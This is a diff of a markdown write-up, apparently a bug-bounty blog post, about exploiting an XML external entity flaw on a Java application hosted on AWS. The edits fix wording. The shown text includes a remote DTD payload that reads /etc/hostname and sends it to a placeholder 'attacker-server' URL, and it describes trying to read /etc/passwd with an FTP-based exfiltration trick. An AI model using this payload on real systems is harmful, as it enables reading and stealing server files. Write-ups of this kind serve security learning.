@@ -107,7 +107,7 @@ The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual ex
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
-3. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
+3. `<!ENTITY % file SYSTEM "file:///etc/hostname">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
 
 4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity %ent, whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
 
@@ -129,11 +129,13 @@ Alright, now with the theory out of the way, the 1st. payload was inserted on th
 
 I always wanted to use that gif... thanks [André](https://x.com/0xacb/status/1954674644524707894).
 
-And just like that I successfully exfiltrated an internal filesystem from the AWS instance. 
+And just like that I successfully exfiltrated an internal filesystem file from the AWS instance. 
 Great, let's try reading something more sensitive `/etc/passwd`:
 
 No luck... The call to my collaborator was empty. I tried with different files but still nothing was returned to my collaborator instance... OK, until this point I'd read a ton of writeups about XXE on Java applications and I knew I was facing the line termination (multiline files) restriction, so only single line files could be read out.
 
 Time to pull out the FTP trick to exfil mutiline files (thanks to Novikov). I found a [script](https://github.com/lc/230-OOB/blob/master/230.py) created by [Corben Leo](https://x.com/hacker_) that emulates an FTP server for OOB attacks.
 
-After having a lot of issues setting up the server on my VPS (skill issue), I finally was able to do it. Then, I repeated all the exploitation steps, which lead me to... nada land, again... 
+After having a lot of issues setting up the server on my VPS (skill issue), I finally was able to do it. Then, I repeated all the exploitation steps, which lead me to...  
+
+Nada land, again.
